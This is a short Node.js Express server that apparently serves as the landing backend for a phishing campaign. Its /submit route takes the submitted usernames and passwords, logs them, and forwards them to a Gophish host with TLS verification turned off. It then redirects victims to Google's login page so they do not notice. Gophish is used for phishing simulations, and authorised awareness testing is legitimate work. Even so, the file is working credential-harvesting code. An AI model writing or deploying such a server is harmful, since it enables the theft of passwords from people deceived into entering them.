const express = require('express')
const path = require('path')
const axios = require('axios')
const https = require('https')
const app = express()

app.use(express.urlencoded({ extended: true }))
app.use(express.static('public'))

const GOPHISH_API_KEY = process.env.GOPHISH_API_KEY
const GOPHISH_HOST   = process.env.GOPHISH_HOST
const REDIRECT_URL   = process.env.REDIRECT_URL || 'https://accounts.google.com'

const httpsAgent = new https.Agent({ rejectUnauthorized: false })

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'))
})

app.post('/submit', async (req, res) => {
  const { username, password, rid } = req.body

  console.log(`Captured → Email: ${username} | RID: ${rid}`)

  try {
    // Correct way — POST to Gophish with rid as query param
    await axios.post(
      `${GOPHISH_HOST}/?rid=${rid}`,
      new URLSearchParams({ 
        username: username, 
        password: password 
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-Gophish-Contact': GOPHISH_API_KEY
        },
        httpsAgent,
        maxRedirects: 0,
        validateStatus: (status) => status < 500
      }
    )
    console.log(`Reported to Gophish ✅`)
  } catch (err) {
    console.error('Gophish error:', err.message)
  }

  res.redirect(REDIRECT_URL)
})

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running')
})
